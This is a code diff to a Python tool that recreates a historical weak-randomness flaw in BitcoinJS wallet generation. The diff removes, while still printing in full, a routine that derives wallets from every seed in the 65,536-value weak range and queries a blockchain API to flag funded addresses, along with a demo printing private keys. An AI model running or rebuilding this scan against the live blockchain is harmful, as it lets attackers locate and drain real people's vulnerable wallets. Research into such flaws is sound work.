@@ -142,29 +142,6 @@ class BitcoinJSVulnerabilityRecreator:
 
         return addresses
 
-    def check_address_balance(self, address: str) -> Dict:
-        """Check Bitcoin address balance and transaction count using blockchain API"""
-        try:
-            # Using BlockCypher API (free tier)
-            url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance"
-            response = requests.get(url, timeout=10)
-
-            if response.status_code == 200:
-                data = response.json()
-                return {
-                    'address': address,
-                    'balance': data.get('balance', 0),
-                    'total_received': data.get('total_received', 0),
-                    'total_sent': data.get('total_sent', 0),
-                    'n_tx': data.get('n_tx', 0),
-                    'unconfirmed_balance': data.get('unconfirmed_balance', 0)
-                }
-            else:
-                return {'address': address, 'error': f'HTTP {response.status_code}'}
-
-        except Exception as e:
-            return {'address': address, 'error': str(e)}
-
     def generate_vulnerable_wallet(self, seed_value: int) -> Dict:
         """Generate a wallet using the vulnerable method"""
         try:
@@ -190,71 +167,6 @@ class BitcoinJSVulnerabilityRecreator:
         except Exception as e:
             return {'seed_value': seed_value, 'error': str(e)}
 
-    def scan_vulnerable_range(self, start: int = 0, end: int = 65536,
-                              check_blockchain: bool = True, delay: float = 0.1) -> List[Dict]:
-        """
-        Scan through the vulnerable range and optionally check blockchain
-
-        Args:
-            start: Starting seed value
-            end: Ending seed value (max 65536 for the vulnerability)
-            check_blockchain: Whether to check each address on blockchain
-            delay: Delay between blockchain API calls (to avoid rate limiting)
-        """
-        results = []
-        interesting_wallets = []
-
-        print(f"Scanning vulnerable range {start} to {min(end, 65536)}...")
-        print(f"Blockchain checking: {'ON' if check_blockchain else 'OFF'}")
-        print("-" * 60)
-
-        for seed in range(start, min(end, 65536)):
-            wallet = self.generate_vulnerable_wallet(seed)
-
-            if 'error' in wallet:
-                print(f"Error generating wallet {seed}: {wallet['error']}")
-                continue
-
-            results.append(wallet)
-
-            if check_blockchain:
-                # Check all address formats
-                address_types = ['p2pkh_compressed', 'p2pkh_uncompressed', 'p2sh_compressed', 'p2sh_uncompressed']
-
-                for addr_type in address_types:
-                    if addr_type in wallet:
-                        address = wallet[addr_type]
-                        balance_info = self.check_address_balance(address)
-
-                        wallet[f'blockchain_info_{addr_type}'] = balance_info
-
-                        # If wallet has any activity, mark as interesting
-                        if ('balance' in balance_info and balance_info['balance'] > 0) or \
-                                ('total_received' in balance_info and balance_info['total_received'] > 0):
-                            interesting_wallets.append({
-                                'wallet': wallet,
-                                'address_type': addr_type,
-                                'balance_info': balance_info
-                            })
-                            print(f"🔍 INTERESTING: Seed {seed} ({addr_type})")
-                            print(f"   Address: {address}")
-                            print(f"   Balance: {balance_info.get('balance', 0)} sats")
-                            print(f"   Total received: {balance_info.get('total_received', 0)} sats")
-                            print(f"   Transactions: {balance_info.get('n_tx', 0)}")
-
-                # Rate limiting
-                time.sleep(delay)
-
-            # Progress indicator
-            if seed % 1000 == 0:
-                print(f"Progress: {seed}/65536 ({seed / 655.36:.1f}%)")
-
-        print(f"\n✅ Scan complete!")
-        print(f"📊 Generated {len(results)} wallets")
-        print(f"🎯 Found {len(interesting_wallets)} interesting wallets")
-
-        return results, interesting_wallets
-
     def save_results(self, results: List[Dict], filename: str = "vulnerable_wallets.json"):
         """Save results to JSON file"""
         with open(filename, 'w') as f:
@@ -272,21 +184,6 @@ def main():
     # Change entropy here (e.g., 17 bits)
     entropy_bits = 20
     recreator = BitcoinJSVulnerabilityRecreator(entropy_bits=entropy_bits)
-
-    # Example: Generate a few specific wallets
-    print("\n🔍 Generating sample vulnerable wallets:")
-    for seed in [0, 1, 1337, 12345, 65535]:
-        wallet = recreator.generate_vulnerable_wallet(seed)
-        if 'error' in wallet:
-            print(f"\nSeed {seed}: ERROR - {wallet['error']}")
-            continue
-
-        print(f"\nSeed {seed}:")
-        print(f"  Private Key: {wallet['private_key_hex']}")
-        print(f"  P2PKH (compressed):   {wallet['p2pkh_compressed']}")
-        print(f"  P2PKH (uncompressed): {wallet['p2pkh_uncompressed']}")
-        print(f"  P2SH (compressed):    {wallet['p2sh_compressed']}")
-        print(f"  P2SH (uncompressed):  {wallet['p2sh_uncompressed']}")
 
     print("\n📝 Address Format Timeline:")
     print("  • P2PKH (starts with '1'): Available throughout 2011-2012 vulnerable period")
